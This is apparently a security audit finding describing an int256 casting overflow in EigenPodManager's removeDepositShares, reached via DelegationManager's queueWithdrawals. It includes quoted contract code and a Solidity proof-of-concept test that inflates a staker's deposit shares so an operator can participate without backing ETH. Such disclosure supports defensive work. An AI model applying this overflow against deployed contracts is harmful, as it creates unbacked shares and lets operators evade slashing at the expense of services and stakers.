## Casting overflow in `EigenPodManager::removeDepositShares()` causes operators to participate with no backing ETH
### Summary

casting overflow in `EigenPodManager::removeDepositShares()` allows that attack to have `podOwnerDepositShares` non packed by any ETH, making any slashing act on him useless and makes his malicious activity on AVS to have no risks

### Finding Description

The vulnerability occurs in the queueWithdrawals function when processing withdrawals for beacon chain ETH strategy. 

The `EigenPodManager` tracks shares using `int256`, but the withdrawal amount is processed as `uint256`. When a withdrawal amount larger than type(int256).max is submitted, it causes the submitted amount to overflow to a negative amounts here
```solidity
File: EigenPodManager.sol
153:         int256 updatedShares = podOwnerDepositShares[staker] - int256(depositSharesToRemove);
```
then when calculating `updatedShares` by negating from the negative overflowed number it will be a big positive number (negating a negative number)

The problem is that in `DelegationManager::queueWithdrawals()` it was assumed that calls will revert on arithmetic overflows (user negating more shares that he has)
```solidity
File: DelegationManager.sol
180:     function queueWithdrawals(
191:             // Remove shares from staker's strategies and place strategies/shares in queue.
192:             // If the staker is delegated to an operator, the operator's delegated shares are also reduced
193:             // NOTE: This will fail if the staker doesn't have the shares implied by the input parameters.
194:             // The view function getWithdrawableShares() can be used to check what 
```
This is true for cases with strategyManagers, cause they track shares in uint256, unlike the `EigenPodManager` that unsafely casts to `int256`

Notice that iam aware of the fact that if the withdrawal got completed as shares (no way for it to be taken as token) the overflow will happen in `EigenPodManager::_addShares()` and it will revert
```solidity
File: EigenPodManager.sol
258:     function _addShares(address staker, uint256 shares) internal returns (uint256, uint256) {
259:         require(staker != address(0), InputAddressZero());
260:         require(int256(shares) >= 0, SharesNegative());
```
But the point is that we never want to complete it, we manipulated the shares amount in the storage already, and no one can force complete it on me due to this check
```solidity
File: DelegationManager.sol
548:         require(msg.sender == withdrawal.withdrawer, WithdrawerNotCaller());
```

Now after the overflow happens and the storage variable of that staker be in trillions, he can call `DelegationManager::registerAsOperator()`, cause he has to be not delegated to any one so that we don't revert during the flow of `queueWithdrawals()`
```solidity
File: DelegationManager.sol
460:     function _removeSharesAndQueueWithdrawal(
485:             // Remove delegated shares from the operator
486:             if (operator != address(0)) {
492:                 // forgefmt: disable-next-item
493:                 _decreaseDelegation({
494:                     operator: operator,
495:                     staker: staker,
496:                     strategy: strategies[i],
497:                     sharesToDecrease: withdrawableShares[i]
498:                 });
499:             }
.......................

674:     function _decreaseDelegation(
675:         address operator,
676:         address staker,
677:         IStrategy strategy,
678:         uint256 sharesToDecrease
679:     ) internal {
680:         // Decrement operator shares
681:         operatorShares[operator][strategy] -= sharesToDecrease;
682:         emit OperatorSharesDecreased(operator, staker, strategy, sharesToDecrease);
683:     }

```
in Line 681, he would have overflowed the operator shares when attempting to withdraw int256.max+

### Impact Explanation

High
- These artificial shares could be used to:
    - Manipulate voting power
    - Do malicious activity to the allocated AVS without a risk of losing any funds (shares doesn't correspond to ETH)
### Likelihood Explanation

The likelihood is High because:
doesn't require prerequisites

### Proof of Concept

The test demonstrates the vulnerability: paste it into `delegationUnit.t.sol`
```solidity
        function test_queueWithdrawals_overflowVulnerability() public {

        // Initial setup - give the staker some shares in EigenPodManager
        uint256 initialShares = 32e18;
        cheats.prank(address(delegationManagerMock));
        eigenPodManagerMock.setPodOwnerShares(defaultStaker, int256(initialShares));

        // Verify initial shares
        assertEq(eigenPodManagerMock.podOwnerDepositShares(defaultStaker), int256(initialShares), "Initial shares not set correctly");
        
        // Create withdrawal params with amount that will cause overflow
        IStrategy[] memory strategies = new IStrategy[](1);
        strategies[0] = beaconChainETHStrategy;
        uint256[] memory sharesToWithdraw = new uint256[](1);
        sharesToWithdraw[0] = uint256(type(int256).max) + 35e18; // This will cause overflow in EigenPodManager
        QueuedWithdrawalParams[] memory queuedWithdrawalParams = new QueuedWithdrawalParams[](1);
        queuedWithdrawalParams[0] = QueuedWithdrawalParams({
            strategies: strategies,
            depositShares: sharesToWithdraw,
            __deprecated_withdrawer: address(0)
        });
        
        // Queue the withdrawal
        cheats.prank(defaultStaker);
        delegationManager.queueWithdrawals(queuedWithdrawalParams);
        
        // Check that shares in EigenPodManager have been manipulated due to overflow
        int256 sharesAfter = eigenPodManagerMock.podOwnerDepositShares(defaultStaker);
        assertTrue(sharesAfter > int256(initialShares), "Shares should have increased due to overflow");
        console.log("Initial shares:", initialShares);
        console.log("Shares after attack:", uint256(sharesAfter));
    }
```

### Recommendation

To fix this vulnerability:
- Add validation of withdrawal amounts not to exceed `int256.max`:
